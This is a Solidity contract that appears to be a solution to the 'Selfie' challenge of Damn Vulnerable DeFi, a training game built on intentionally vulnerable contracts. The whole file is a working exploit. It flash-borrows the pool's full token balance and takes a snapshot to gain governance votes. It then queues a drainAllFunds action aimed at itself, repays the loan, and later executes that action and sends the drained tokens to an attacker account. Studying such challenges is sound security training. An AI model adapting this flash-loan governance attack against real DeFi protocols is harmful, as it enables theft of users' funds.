// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";


/**
 * @title SelfieAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieAttacker {
  SelfiePool private immutable selfiePool;
  SimpleGovernance private immutable simpleGovernance;
  DamnValuableTokenSnapshot private token;
  uint256 private actionId;

  constructor(address addrSelfiePool, address addrSimpleGovernance) {
    selfiePool = SelfiePool(addrSelfiePool);
    simpleGovernance = SimpleGovernance(addrSimpleGovernance);
  }

  function preattack() external {
    uint256 balance = selfiePool.token().balanceOf(address(selfiePool));
    selfiePool.flashLoan(balance);
  }

  function attack(address attackerEOA) external {
    // execute the action previously submitted
    simpleGovernance.executeAction(actionId);
    uint256 tokenBalance = token.balanceOf(address(this));
    token.transfer(attackerEOA, tokenBalance);
  }

  function receiveTokens(address tokenAddress, uint256 amount) external {
    token = DamnValuableTokenSnapshot(tokenAddress);
    token.snapshot();

    // submit action to queue
    bytes memory payload = abi.encodeWithSignature(
        "drainAllFunds(address)",
        address(this)
    );
    actionId = simpleGovernance.queueAction(address(selfiePool), payload, 0);

    // return the fund to selfiePool    
    token.transfer(address(selfiePool), amount);
  }
}